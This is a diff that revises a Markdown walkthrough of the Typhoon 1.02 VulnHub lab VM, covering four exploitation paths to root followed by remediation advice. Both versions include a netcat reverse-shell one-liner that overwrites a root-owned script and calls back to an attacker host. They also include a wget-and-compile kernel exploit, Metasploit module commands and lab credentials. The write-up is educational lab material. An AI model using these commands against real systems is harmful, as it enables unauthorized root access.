@@ -1,187 +1,276 @@
 # Typhoon: 1.02 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Difficulty** | Medium |
 | **OS** | Linux (Ubuntu 14.04) |
-| **Root Flag** | /root/root-flag |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/typhoon-102,267/) |
+| **Goal** | root flag (`root-flag`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/typhoon-1-02-vulnhub-walkthrough/) |
+| **VulnHub** | https://www.vulnhub.com/entry/typhoon-102,267/ |
 
 ## Attack Summary
 
-Intentionally vulnerable multi-service VM. Four independent root paths: (1) MongoDB blank creds → SSH → kernel exploit; (2) Tomcat default creds → WAR deploy → writable root script; (3) Drupal RCE (drupalgeddon2); (4) Lotus CMS RCE.
+Typhoon 1.02 is a deliberately vulnerable VM with multiple services and four distinct exploitation paths. The primary path extracts credentials from an exposed MongoDB admin interface, logs in via SSH, and escalates privileges using a local kernel exploit (CVE-2015-1328, exploit-db 37292). Alternative paths include Apache Tomcat Manager file upload, Drupalgeddon2, and Lotus CMS PHP execution, each of which can then leverage a root-owned world-writable script or the kernel exploit.
 
 ## Methodology
 
-1. Network discovery and full port scan
-2. Path A: MongoDB admin → credentials → SSH → kernel exploit (EDB-37292)
-3. Path B: Tomcat Manager default creds → Metasploit upload → cron/script injection
-4. Path C: Drupal drupalgeddon2
-5. Path D: Lotus CMS lcms_php_exec
+1. Host discovery and full port scan
+2. Web enumeration on ports 80 and 8080
+3. **Path 1:** MongoDB credential extraction → SSH → kernel exploit (root)
+4. **Path 2:** Tomcat Manager upload → Meterpreter → writable script → root
+5. **Path 3:** Drupal RCE (Drupalgeddon2)
+6. **Path 4:** Lotus CMS RCE
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery and Scan
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover
+```
+
+Target identified at `192.168.1.101`.
+
+### Full Port Scan
+
+```bash
 nmap -A 192.168.1.101
 ```
 
-Open ports: 21 (FTP), 22 (SSH), 25 (SMTP), 53 (DNS), 80 (HTTP), 110 (POP3), 139/445 (SMB), 3306 (MySQL), 5432 (PostgreSQL), 8080 (Tomcat).
+![nmap scan](images/01-nmap.png)
 
-Check `robots.txt`:
+Open ports:
 
+| Port | Service |
+|---|---|
+| 21 | FTP |
+| 22 | SSH |
+| 25 | SMTP |
+| 53 | DNS |
+| 80 | HTTP (Apache) |
+| 110 | POP3 |
+| 111 | rpcbind |
+| 139/445 | NetBIOS/SMB |
+| 143 | IMAP |
+| 631 | IPP (CUPS) |
+| 993 | IMAPS |
+| 995 | POP3S |
+| 2049 | NFS |
+| 3306 | MySQL |
+| 5432 | PostgreSQL |
+| 8080 | HTTP (Apache Tomcat/Coyote JSP 1.1) |
+
+### robots.txt
+
+```bash
+curl http://192.168.1.101/robots.txt
 ```
-http://192.168.1.101/robots.txt
-# Entry: /monoadmin/
+
+The file contains a reference to `/mongoadmin/` — a MongoDB admin web interface.
+
+## Step 2: Web Enumeration
+
+### Directory Brute-Force
+
+```bash
+dirb http://192.168.1.101
 ```
 
-![Netdiscover result](images/01-netdiscover.png)
+Finds `/drupal/` and `/cms/` in addition to `/mongoadmin/`.
+
+### Port 8080 — Tomcat
+
+Navigate to `http://192.168.1.101:8080`. Apache Tomcat Manager is accessible. Test default credentials:
+
+- `tomcat` / `tomcat` — **success**
 
 ---
 
-## Path A: MongoDB → SSH → Kernel Exploit
+## Path 1: MongoDB → SSH → Kernel Exploit (Recommended)
 
-### Step 2: MongoDB Credential Extraction
+### Step 3a: MongoDB Credential Extraction
 
-Browse to `/monoadmin/`. Switch to the `credentials` database and open the credential records:
+Browse to `http://192.168.1.101/mongoadmin/`. Set the database to `credentials` (listed at ~84 MB).
 
-```
-http://192.168.1.101/monoadmin/
-```
+The collection reveals two credential entries. Note the credentials for user `typhoon`.
 
-Credentials: **typhoon : 789456123**
+![MongoDB admin](images/02-mongodb.png)
 
-![MongoDB admin credentials](images/02-mongodb-creds.png)
+![credentials](images/03-credentials.png)
 
-### Step 3: SSH Login
+**Credentials:** `typhoon` / `789456123`
+
+### Step 4a: SSH Login
 
 ```bash
 ssh typhoon@192.168.1.101
-# password: 789456123
-uname -a
-# Ubuntu 14.04 → vulnerable to overlayfs (CVE-2015-1328) or ofs (EDB-37292)
+# Password: 789456123
 ```
 
-### Step 4: Kernel Exploit (EDB-37292)
+### Step 5a: Kernel Exploit — CVE-2015-1328
 
-On attacker — serve the exploit:
+Check the OS version:
 
 ```bash
-searchsploit -m 37292.c
+uname -a
+lsb_release -a
+```
+
+Ubuntu 14.04 is vulnerable to a local privilege escalation via the overlayfs filesystem driver (CVE-2015-1328).
+
+Search for a matching exploit:
+
+```bash
+searchsploit ubuntu 14.04 local
+```
+
+![searchsploit](images/04-searchsploit.png)
+
+Exploit: `37292.c` (Exploit-DB 37292).
+
+On the attacker machine:
+
+```bash
+cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/
+cd /root
 python3 -m http.server 80
 ```
 
-On target:
+On the target:
 
 ```bash
 cd /tmp
-wget http://ATTACKER_IP/37292.c
+wget http://192.168.1.109/37292.c
+ls
 gcc 37292.c -o rootshell
-chmod +x rootshell
+chmod 777 rootshell
 ./rootshell
-id
-# uid=0(root)
-cat /root/root-flag
 ```
 
-![Root flag — Path A](images/03-root-flag.png)
+Root shell obtained.
+
+### Step 6a: Read the Flag
+
+```bash
+cd /root
+ls
+cat root-flag
+```
+
+![root flag](images/05-root-flag.png)
 
 ---
 
-## Path B: Tomcat Manager → Script Injection
+## Path 2: Tomcat Manager → Meterpreter → Root
 
-### Step 5: Tomcat Default Credentials
-
-Browse to `http://192.168.1.101:8080/manager`. Authenticate with **tomcat : tomcat**.
-
-There is also a file `/tab/script.sh` owned by root with world-writable permissions.
-
-![Tomcat manager](images/04-tomcat.png)
-
-### Step 6: Metasploit WAR Upload
+### Step 3b: Metasploit Tomcat Manager Upload
 
 ```bash
 msfconsole
 use exploit/multi/http/tomcat_mgr_upload
-set RHOSTS 192.168.1.101
-set RPORT 8080
-set HttpUsername tomcat
-set HttpPassword tomcat
-run
+set rhost 192.168.1.101
+set rport 8080
+set httpusername tomcat
+set httppassword tomcat
+exploit
 ```
 
-Meterpreter session opens as `tomcat`. Now overwrite the root-writable script:
+A Meterpreter session opens. Drop to a shell:
 
 ```bash
-echo "mkfifo /tmp/vvwjo; nc ATTACKER_IP 1234 0</tmp/vvwjo | /bin/sh >/tmp/vvwjo 2>&1; rm /tmp/vvwjo" > /tab/script.sh
+shell
 ```
 
-Start listener and wait for the script execution:
+### Step 4b: Writable Root Script
+
+Enumerate writable files and directories:
 
 ```bash
-nc -lvp 1234
-# root shell received
+find / -writable -type f 2>/dev/null | grep -v proc
+ls -la /tab/script.sh
 ```
+
+The file `/tab/script.sh` is owned by root but world-writable.
+
+### Step 5b: Overwrite script.sh
+
+Generate a netcat reverse shell:
+
+```bash
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=1234 R
+```
+
+Overwrite the script:
+
+```bash
+echo "mkfifo /tmp/vvwjo; nc 192.168.1.109 1234 0</tmp/vvwjo | /bin/sh >/tmp/vvwjo 2>&1; rm /tmp/vvwjo" > /tab/script.sh
+```
+
+Start a listener on port 1234:
+
+```bash
+nc -lvnp 1234
+```
+
+When the script executes (via cron or another trigger), a root shell arrives.
 
 ---
 
-## Path C: Drupal drupalgeddon2
-
-### Step 7: Directory Enumeration
-
-```bash
-dirb http://192.168.1.101/
-# Found: /drupal and /cms
-```
-
-![Directory enumeration](images/05-drupal.png)
-
-### Step 8: Exploit Drupal
+## Path 3: Drupalgeddon2 (CVE-2018-7600)
 
 ```bash
 msfconsole
 use exploit/unix/webapp/drupal_drupalgeddon2
-set RHOSTS 192.168.1.101
-set TARGETURI /drupal
-run
+set rhost 192.168.1.101
+set targeturi /drupal
+exploit
 ```
 
-Meterpreter session as `www-data`. Follow Path A post-exploitation for kernel escalation.
+Meterpreter session as www-data. Escalate to root using Path 1's kernel exploit method.
 
 ---
 
-## Path D: Lotus CMS RCE
+## Path 4: Lotus CMS RCE
 
 ```bash
 msfconsole
 use exploit/multi/http/lcms_php_exec
-set RHOSTS 192.168.1.101
-set URI /cms/
-run
+set rhost 192.168.1.101
+set uri /cms/
+exploit
 ```
 
-Meterpreter as `www-data`. Escalate via kernel exploit as in Path A.
+Meterpreter session obtained. Escalate to root as above.
 
 ---
 
+## Vulnerabilities Found
+
+| # | Vulnerability | Location | Severity |
+|---|---|---|---|
+| 1 | MongoDB admin interface exposed with no authentication | Port 80 `/mongoadmin/` | Critical |
+| 2 | Plaintext credentials in MongoDB | `credentials` collection | Critical |
+| 3 | CVE-2015-1328 (overlayfs LPE) | Ubuntu 14.04 kernel | High |
+| 4 | Tomcat Manager with default credentials | Port 8080 | Critical |
+| 5 | World-writable root-owned cron script | `/tab/script.sh` | Critical |
+| 6 | Drupalgeddon2 (CVE-2018-7600) | `/drupal/` | Critical |
+| 7 | Lotus CMS unauthenticated PHP execution | `/cms/` | Critical |
+
 ## Lessons Learned
 
-1. **MongoDB without authentication** — database admin panel exposed with no credentials
-2. **Credential reuse** — web app credentials reused for SSH
-3. **Outdated kernel (Ubuntu 14.04)** — vulnerable to overlayfs LPE (CVE-2015-1328)
-4. **Default Tomcat credentials** — `tomcat:tomcat` left unchanged
-5. **World-writable root-executed scripts** — any file run by root with open permissions is a privesc path
-6. **Multiple unpatched CMSes** — Drupal and Lotus CMS both exploitable via public Metasploit modules
+- Every exposed service is an attack surface. This VM's breadth of open ports means any one service compromise can lead to root.
+- MongoDB admin interfaces must never be exposed without authentication on production or network-reachable systems.
+- Long-unpatched Ubuntu kernels (14.04 EOL) have well-known local escalation exploits in public databases.
+- Default credentials on Tomcat Manager are universally known and exploited; always change them immediately after deployment.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| MongoDB no-auth | Enable authentication; bind to localhost |
-| Default Tomcat creds | Change default credentials immediately after installation |
-| Kernel CVE-2015-1328 | Update to Ubuntu 16.04+ or apply kernel patches |
-| World-writable root scripts | Audit file permissions; use `chmod 700` for root-executed files |
-| Drupal/Lotus CMS unpatched | Keep CMS installations updated; remove unused apps |
+|---|---|
+| MongoDB exposed admin | Bind MongoDB to localhost; remove `mongoadmin` from web root |
+| Default Tomcat credentials | Change `tomcat-users.xml` credentials; remove Manager app if unused |
+| Unpatched kernel | Update to a supported Ubuntu LTS release with regular patching |
+| Writable root scripts | `chmod 700 /tab/script.sh; chown root:root /tab/script.sh` |
+| Drupal outdated | Update Drupal core; apply security advisories SA-CORE-2018-002 |
+| Lotus CMS exposed | Remove or update `/cms/`; restrict with authentication |
